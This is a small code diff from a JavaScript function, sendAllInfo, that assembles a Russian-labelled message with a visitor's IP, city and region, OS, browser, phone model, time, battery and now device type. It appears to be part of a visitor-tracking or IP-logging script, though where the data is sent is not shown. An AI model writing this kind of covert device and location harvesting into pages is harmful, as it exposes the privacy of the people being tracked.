@@ -99,7 +99,8 @@ async function sendAllInfo() {
         ip = `🌍 IP: ${data.ip}\n📍 Регион: ${data.city}, ${data.region}, ${data.country_name}`;
     } catch(e) {}
     
-    const message = `📱 ОС: ${os} | ${browser}
+    const message = `${deviceType}
+📱 ОС: ${os} | ${browser}
 📲 Модель: ${phoneModel}
 ⏰ Время: ${time}
 ${battery}
